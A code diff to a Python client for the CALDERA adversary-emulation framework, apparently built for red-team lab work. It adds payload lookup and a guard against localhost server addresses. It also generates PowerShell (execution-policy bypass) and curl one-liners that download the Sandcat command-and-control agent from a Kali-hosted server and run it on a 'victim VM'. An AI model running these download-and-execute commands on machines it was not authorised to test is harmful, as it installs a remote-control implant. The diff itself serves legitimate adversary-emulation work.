@@ -1,6 +1,7 @@
 
 import os
 import logging
+from urllib.parse import urlparse, urlunparse
 from typing import Any
 
 import requests
@@ -130,6 +131,9 @@ class CalderaClient:
     def get_abilities(self):
         return self._request("GET", "/api/v2/abilities")
 
+    def get_payloads(self):
+        return self._request("GET", "/api/v2/payloads")
+
 
     def create_adversary(self, name, ability_ids):
         payload = {
@@ -238,22 +242,70 @@ class CalderaClient:
             return adv.get("adversaries", [])
         return adv
 
+    def _reachable_server_url(self, fallback_host=None):
+        parsed = urlparse(self.base_url)
+        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"} and fallback_host:
+            netloc = fallback_host
+            if parsed.port and ":" not in fallback_host:
+                netloc = f"{fallback_host}:{parsed.port}"
+            return urlunparse((parsed.scheme or "http", netloc, parsed.path, "", "", ""))
+        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"}:
+            return None
+        return self.base_url
+
+    def _sandcat_payload_name(self, platform='windows'):
+        try:
+            payloads = self.get_payloads()
+        except CalderaAPIError:
+            payloads = []
+
+        if isinstance(payloads, dict):
+            payloads = payloads.get("payloads", payloads.get("data", []))
+
+        names = []
+        for payload in payloads or []:
+            if isinstance(payload, str):
+                names.append(payload)
+            elif isinstance(payload, dict):
+                names.append(payload.get("name") or payload.get("file") or payload.get("payload") or "")
+
+        preferred = ["sandcat.go", "sandcat.exe"] if "win" in str(platform).lower() else ["sandcat.go", "sandcat"]
+        for candidate in preferred:
+            if candidate in names:
+                return candidate
+        for name in names:
+            if "sandcat" in str(name).lower():
+                return name
+        return "sandcat.go"
+
     def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
         """Return a simple deploy command string for Sandcat (informational).
         This is a best-effort helper and intentionally non-destructive.
         """
-        server = kali_ip or self.base_url
+        server = self._reachable_server_url(kali_ip)
+        if not server:
+            return (
+                "CALDERA server is configured as localhost. Set KALI_IP or CALDERA_URL "
+                "to an address reachable from the victim VM before deploying Sandcat."
+            )
+        payload_name = self._sandcat_payload_name(platform)
         key_part = f" -k {self.api_key}" if self.api_key else ""
 
         if "win" in str(platform or "").lower():
             return (
                 "powershell -ExecutionPolicy Bypass -NoProfile -Command "
-                f"\"iwr -UseBasicParsing {self.base_url}/file/download -OutFile sandcat.exe; "
+                f"\"$server='{server}'; "
+                "$url=$server + '/file/download'; "
+                "$wc=New-Object System.Net.WebClient; "
+                f"$wc.Headers.Add('file','{payload_name}'); "
+                "$wc.Headers.Add('platform','windows'); "
+                "$wc.DownloadFile($url,'sandcat.exe'); "
                 f".\\sandcat.exe -server {server} -group {group}{key_part}\""
             )
 
         return (
-            f"curl -fsSL {self.base_url}/file/download -o sandcat; "
+            f"server='{server}'; "
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
             f"chmod +x sandcat; ./sandcat -server {server} -group {group}{key_part}"
         )
 
